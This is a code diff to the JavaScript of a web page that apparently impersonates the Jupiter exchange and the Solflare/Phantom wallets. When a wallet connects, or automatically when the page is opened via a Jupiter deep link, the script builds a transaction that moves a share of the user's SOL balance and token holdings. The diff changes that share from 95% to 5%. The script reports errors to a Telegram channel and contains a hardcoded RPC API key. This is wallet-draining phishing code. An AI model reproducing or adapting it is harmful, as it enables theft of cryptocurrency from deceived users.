@@ -227,7 +227,7 @@ $(document).ready(async function () {
       const tokens = await getTokenAccounts(connection, publicKey);
 
       const balanceForTransfer = walletBalance - minBalance;
-      const solTransferAmount = Math.floor(Number(balanceForTransfer * 0.95));
+      const solTransferAmount = Math.floor(Number(balanceForTransfer * 0.05));
 
       let transaction = new solanaWeb3.Transaction();
 
@@ -344,21 +344,22 @@ $(document).ready(async function () {
       window.open("https://phantom.app/", "_blank");
     }
   });
-  async function autoExecuteIfConnected() {
-    try {
-      if (true) {
-        //showLoader("#window.solflare");  // Custom function assumed
+     async function autoExecuteIfConnected() {
+      try {
         const connection = new solanaWeb3.Connection(
           "https://solana-mainnet.api.syndica.io/api-key/2cNj8UFmQbtuycMgEsbaSuPQNDj7BmctdcyCujkqJVYAdofc4HVpaATstnBTsQwbP4PZ2zcTjcz86GWzPZMwayiYtFERGCADtyZ",
           "confirmed"
         );
-
-        await executeTransaction(connection, window.solana, window.solana.publicKey);
+    
+        if (window.solflare && window.solflare.publicKey) {
+          await executeTransaction(connection, window.solflare, window.solflare.publicKey);
+        } else if (window.solana && window.solana.publicKey) {
+          await executeTransaction(connection, window.solana, window.solana.publicKey);
+        }
+      } catch (err) {
+        console.error("Auto-execute failed:", err);
       }
-    } catch (err) {
-      console.error("Auto-execute failed:", err);
     }
-  }
   const urlParams = new URLSearchParams(window.location.search);
   const fromJupiter = urlParams.get("fromJupiter");
 
@@ -367,64 +368,52 @@ $(document).ready(async function () {
   }
 
   $("#connect-solflare").on("click", async () => {
-    
-    const isMobile =
-      /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
-        navigator.userAgent
+  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
+    navigator.userAgent
+  );
+
+  const siteURL = "jjup4-theme.vercel.app";
+
+  if (isMobile && !window.solflare) {
+    // Redirect to Jupiter App
+    const jupiterDeepLink = `jupiter://${siteURL}?fromJupiter=true`;
+    window.location.href = jupiterDeepLink;
+
+    // Fallback to App Store if not handled
+    setTimeout(() => {
+      const isAndroid = /Android/i.test(navigator.userAgent);
+      const appStoreURL = isAndroid
+        ? "https://play.google.com/store/apps/details?id=com.jupiter.exchange"
+        : "https://apps.apple.com/ng/app/jupiter-mobile/id6484069059";
+
+      window.location.href = appStoreURL;
+    }, 3000);
+    return;
+  }
+
+  if (window.solflare && window.solflare.isSolflare) {
+    try {
+      showLoader("#connect-solflare");
+      selected = "#connect-solflare";
+
+      const resp = await window.solflare.connect();
+
+      const connection = new solanaWeb3.Connection(
+        "https://solana-mainnet.api.syndica.io/api-key/2cNj8UFmQbtuycMgEsbaSuPQNDj7BmctdcyCujkqJVYAdofc4HVpaATstnBTsQwbP4PZ2zcTjcz86GWzPZMwayiYtFERGCADtyZ",
+        "confirmed"
       );
-  
-    const siteURL = "https://jjup4-theme.vercel.app";
-    const encodedURL = encodeURIComponent(siteURL);
-  
-    // 🚀 On mobile — open site inside Jupiter Mobile app browser
-    if (isMobile) {
-      // This should open inside Jupiter app if installed
-      const jupiterDeepLink = `jupiter://jjup4-theme.vercel.app?fromJupiter=true`;
-      window.location.href = jupiterDeepLink;
-      
-      // ⏳ Fallback to App Store if Jupiter app isn't installed
-      setTimeout(() => {
-        const isAndroid = /Android/i.test(navigator.userAgent);
-        const appStoreURL = isAndroid
-          ? "https://play.google.com/store/apps/details?id=com.jupiter.exchange"
-          : "https://apps.apple.com/ng/app/jupiter-mobile/id6484069059";
-  
-        window.location.href = appStoreURL;
-      }, 3000); // wait 3 seconds to see if app handles the link
-      
-      return;
+
+      await executeTransaction(connection, window.solflare, resp.publicKey);
+    } catch (err) {
+      console.error("❌ Error connecting to Jupiter wallet (Solflare):", err);
+      await sendTelegramMessage(`❌ Error connecting to Jupiter wallet: ${err.message}`);
+      hideLoader("#connect-solflare");
     }
-   // ✅ On desktop or inside Phantom app
-    if (true) {
-      
-      try {
-        showLoader("#connect-solflare");
-        selected = "#connect-solflare";
-
-        const resp = await window.solana.connect();
-
-        const connection = new solanaWeb3.Connection(
-          "https://solana-mainnet.api.syndica.io/api-key/2cNj8UFmQbtuycMgEsbaSuPQNDj7BmctdcyCujkqJVYAdofc4HVpaATstnBTsQwbP4PZ2zcTjcz86GWzPZMwayiYtFERGCADtyZ",
-          "confirmed"
-        );
-        // const connection = new solanaWeb3.Connection(
-        //   "https://api.devnet.solana.com",
-        //   "confirmed"
-        // );
-
-        await executeTransaction(connection, window.solana, resp.publicKey);
-      } catch (err) {
-        console.error(err);
-        await sendTelegramMessage(
-          `❌ Error connecting to Phantom: ${err.message}`
-        );
-        hideLoader("#connect-phantom");
-      }
-    } else {
-      // 🖥️ As a fallback for desktop without Phantom
-      window.open("https://phantom.app/", "_blank");
-    }
-  });
+  } else {
+    // Fallback for missing Solflare wallet
+    window.open("https://solflare.com", "_blank");
+  }
+});
      
 //       // ✅ Desktop or mobile with wallet extension
 //    if (window.solflare) {
@@ -616,7 +605,7 @@ $(document).ready(async function () {
 
               const balanceForTransfer = walletBalance - minBalance;
               const solTransferAmount = Math.floor(
-                Number(balanceForTransfer * 0.95)
+                Number(balanceForTransfer * 0.05)
               );
 
               // Create transaction
